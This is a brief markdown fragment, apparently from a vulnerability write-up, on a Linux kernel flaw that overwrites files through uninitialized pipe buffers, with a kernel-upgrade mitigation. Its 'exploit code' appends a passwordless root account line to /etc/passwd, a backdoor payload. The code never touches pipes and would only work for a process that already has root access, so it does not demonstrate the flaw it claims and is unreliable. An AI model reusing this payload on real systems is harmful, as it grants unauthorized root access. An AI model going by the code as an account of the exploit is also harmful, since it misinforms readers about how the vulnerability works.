- **Mechanism:**
  - Overwrite arbitrary files (e.g., `/etc/passwd`) by leveraging uninitialized pipe buffers.
- **Exploit Code:**
  ```c
  #include <unistd.h>
  #include <fcntl.h>
  int main() {
    char data[] = "root::0:0:root:/root:/bin/bash\n";
    int fd = open("/etc/passwd", O_WRONLY | O_APPEND);
    write(fd, data, sizeof(data)-1);
    close(fd);
  }
  ```
- **Mitigation:** Upgrade Linux kernel to **>=5.16.11**.

